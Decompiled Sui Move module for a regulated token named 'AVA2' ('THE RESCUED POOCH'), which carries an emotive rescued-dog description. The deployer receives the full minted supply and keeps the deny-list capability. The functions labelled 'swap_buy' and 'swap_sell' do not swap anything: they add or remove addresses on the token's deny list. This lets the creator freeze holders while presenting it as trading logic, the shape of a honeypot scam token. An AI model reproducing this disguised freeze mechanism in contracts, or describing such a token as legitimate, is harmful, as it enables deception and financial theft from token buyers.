module 0x7fcc938757fddcebfc5a0bc0b8912b8f22173aee32fe340d9d9c0bd1263b8cbf::ava2 {
    struct AVA2 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: AVA2, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AVA2>(arg0, 9, b"AVA2", b"THE RESCUED POOCH", b"Upon arrival, they found Ava malnourished and missing her right rear leg, which appeared recently amputated. She also had an injured left eye, severe emaciation, and other fractures that had healed abnormally.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZLsLWNfrkqTi9SSE1F2P5E3LByo1PdzuNCt6QAuahuXK"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<AVA2>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AVA2>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<AVA2>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AVA2>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AVA2>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AVA2>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AVA2>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<AVA2>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

